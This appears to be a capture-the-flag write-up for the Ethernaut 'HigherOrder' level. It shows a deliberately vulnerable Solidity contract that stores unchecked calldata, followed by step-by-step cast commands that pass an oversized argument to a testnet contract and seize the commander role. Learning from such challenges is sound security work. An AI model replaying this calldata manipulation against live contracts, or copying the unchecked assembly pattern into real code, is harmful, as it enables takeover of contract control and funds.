---
title: "HigherOrder"
tags: ["calldata"]
reference: https://ethernaut.openzeppelin.com/level/30
---

# Description

Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.

Your objective is to become the Commander of the Higher Order! Good luck!

Things that might help:

Sometimes, calldata cannot be trusted.
Compilers are constantly evolving into better spaceships.

```sol
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

# Understand the assembly opcodes

- sstore: save word(32 bytes) to storage
- calldataload(4): read calldata after function selector

# Attack

1. craft the "correct" calldata

```
cast calldata "registerTreasury(uint8)" 0xff
0x211c85ab00000000000000000000000000000000000000000000000000000000000000ff
```

2. call `registerTreasury` function where passing an argument > 1 byte

```
cast send 0x32D15928B8185Aeb2E8E0E793C3f0fa85Aa9F23A 0x211c85ab0000000000000000000000000000000000000000000000000000000000ffffff --rpc-url $BASE_SEPOLIA_RPC --private-key $KEY
```

3. check if `treasury` variable is > 255

```
cast storage 0x32D15928B8185Aeb2E8E0E793C3f0fa85Aa9F23A 1 --rpc-url $BASE_SEPOLIA_RPC
0x0000000000000000000000000000000000000000000000000000000000ffffff
```

4. claim leadership

```
> cast send 0x32D15928B8185Aeb2E8E0E793C3f0fa85Aa9F23A "claimLeadership()" --rpc-url $BASE_SEPOLIA_RPC --private-key $KEY
> cast storage 0x32D15928B8185Aeb2E8E0E793C3f0fa85Aa9F23A 0 --rpc-url $BASE_SEPOLIA_RPC
0x000000000000000000000000b1473ba227c4645501e0e05f4839b00ed8320d33 // player address
```
